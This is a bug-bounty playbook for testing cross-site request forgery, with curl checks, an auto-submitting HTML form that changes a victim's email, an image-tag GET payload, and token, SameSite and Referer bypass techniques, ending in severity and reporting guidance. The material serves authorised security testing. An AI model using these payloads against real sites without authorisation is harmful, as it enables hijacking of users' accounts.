# CSRF Testing Playbook — Bug Bounty

> Source: PortSwigger Web Security Academy. Cross-site request forgery methodology.

---

## Quick Detection

```bash
# 1. POST without CSRF token — does action succeed?
curl -s -X POST https://TARGET/api/action -d 'param=value' -b 'session=TOKEN' | head -c 500

# 2. Origin/Referer validation?
curl -s -X POST https://TARGET/api/change-email -H 'Origin: https://evil.com' -d 'email=attacker@evil.com' -b 'session=TOKEN' | head -c 300

# 3. SameSite cookie attribute
curl -sI https://TARGET/ | grep -i 'set-cookie' | grep -oP 'SameSite=[^;]+'
```

---

## Prerequisites (3 conditions — if ANY missing, not CSRF)

1. **Relevant action** — privileged or user-data action worth inducing (change email/password, funds transfer, permission change)
2. **Cookie-based session handling** — ONLY session cookies identify the user; no other mechanism. (Also: HTTP Basic auth, certificate-based auth)
3. **No unpredictable request parameters** — e.g. change-password NOT vulnerable if attacker must know current password

---

## Defense Landscape & Bypass Vectors

### V1 — No CSRF protection
PoC:
```html
<html><body>
<form action="https://TARGET/email/change" method="POST">
<input type="hidden" name="email" value="pwned@evil-user.net">
</form>
<script>document.forms[0].submit();</script>
</body></html>
```

### V2 — CSRF token bypasses
- Token tied to session but NOT validated server-side → delete param
- Token from one session valid in another → use attacker's own token (token session-fixation)
- Token not tied to session at all → any valid token works
- Token in cookie (double-submit) where attacker can set cookie on target domain (subdomain takeover / CRLF) → forge pair
- GET vs POST method confusion: token only checked on POST → do GET action
- Token only checked when param present → drop the param entirely

### V3 — SameSite bypass
Chrome enforces `Lax` by default since 2021.

| SameSite | Cross-site POST | Cross-site top-level GET |
|---|---|---|
| None | sent | sent |
| Lax | blocked | sent |
| Strict | blocked | blocked |

Bypasses: GET-based action; site is ≤1 year old (Lax-by-default exempt, "2-minute window" for recent cookies); sibling-domain cookie injection (`target.com` cookie readable/injectable from `sub.target.com` via inherited domain cookie).

### V4 — Referer-based validation bypass
- `Referrer-Policy: no-referrer` in PoC page → strip Referer entirely (validation often skips missing header)
- If regex checks `target.com` anywhere in Referer → register `evil-target.com` or path `https://evil.com/target.com`
- URL-encoding tricks to hide domain in query string

### V5 — Delivery notes
- Same delivery as reflected XSS (link via email/social)
- GET-based CSRF can be fully self-contained: `<img src="https://TARGET/email/change?email=pwned@evil-user.net">`

---

## PoC Construction

Burp Pro: right-click request → Engagement tools / Generate CSRF PoC. Tweak options for quirky requests. Test in logged-in browser → confirm action occurs.

---

## By-Design Filters (SKIP)

- Logout/login CSRF (no security impact)
- Actions requiring current password
- Nonce in URL attacker can't predict
- CSRF-protected by custom header + strict CORS
- Analytics/tracking endpoints

---

## Severity Guide

| Impact | Severity |
|---|---|
| Change password / funds transfer | CRITICAL |
| Change email → full ATO chain (via reset) | HIGH |
| Privilege/permission change | CRITICAL |
| Non-sensitive settings change | LOW / INFO |
| Logout CSRF | INFO |

---

## Reporting Checklist

- [ ] Endpoint + method + the 3 prerequisites verified
- [ ] Defense present? (token / SameSite / Referer) + which bypass
- [ ] Self-contained PoC HTML, tested in logged-in browser
- [ ] Concrete action impact documented

> ⚠️ CSRF without impactful action = INFO. Severity = what victim is made to do.